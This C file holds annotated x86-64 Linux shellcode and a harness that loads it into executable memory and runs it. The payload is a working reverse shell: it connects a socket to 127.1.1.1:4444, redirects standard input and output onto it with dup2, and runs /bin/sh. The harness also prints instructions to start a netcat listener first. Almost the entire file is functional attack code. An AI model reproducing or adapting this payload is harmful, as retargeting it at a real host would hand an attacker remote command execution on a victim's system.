#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>


unsigned char shellcode[] = 
    // --- 1. Socket ---
    "\x6a\x29"                  // push 41
    "\x58"                      // pop rax
    "\x99"                      // cdq
    "\x6a\x02"                  // push 2
    "\x5f"                      // pop rdi
    "\x6a\x01"                  // push 1
    "\x5e"                      // pop rsi
    "\x0f\x05"                  // syscall
    
    // --- 2. Connect (127.1.1.1:4444) ---
    "\x48\x97"                  // xchg rax, rdi
    "\x48\xb8\x02\x00\x11\x5c\x7f\x01\x01\x01" // mov rax, ...
    "\x50"                      // push rax
    "\x48\x89\xe6"              // mov rsi, rsp
    "\x6a\x10"                  // push 16
    "\x5a"                      // pop rdx
    "\x6a\x2a"                  // push 42
    "\x58"                      // pop rax
    "\x0f\x05"                  // syscall

    // --- 3. Dup2 (Redirect IO) ---
    "\x6a\x03"                  // push 3
    "\x5e"                      // pop rsi
    "\x48\xff\xce"              // dec rsi
    "\x6a\x21"                  // push 33
    "\x58"                      // pop rax
    "\x0f\x05"                  // syscall
    "\x75\xf6"                  // jne back

    // --- 4. Execve  ---
    // execve("/bin//sh", 0, 0)
    "\x48\x31\xf6"              // xor rsi, rsi (argv = NULL) 
    "\x48\x31\xd2"              // xor rdx, rdx (envp = NULL)
    "\x56"                      // push rsi (null terminator для строки)
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" // mov rbx, "/bin//sh"
    "\x53"                      // push rbx
    "\x48\x89\xe7"              // mov rdi, rsp (ptr to string)
    "\x6a\x3b"                  // push 59 (execve)
    "\x58"                      // pop rax
    "\x0f\x05";                 // syscall

int main() {
    printf("Shellcode Length: %ld\n", sizeof(shellcode) - 1);

    void *ptr = mmap(0, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    memcpy(ptr, shellcode, sizeof(shellcode) - 1);

    printf("=== FINAL TEST ===\n");
    printf("1. Terminal 1: nc -lvnp 4444\n");
    printf("2. Press ENTER here...\n");
    getchar();

    ((void(*)())ptr)();

    return 0;
}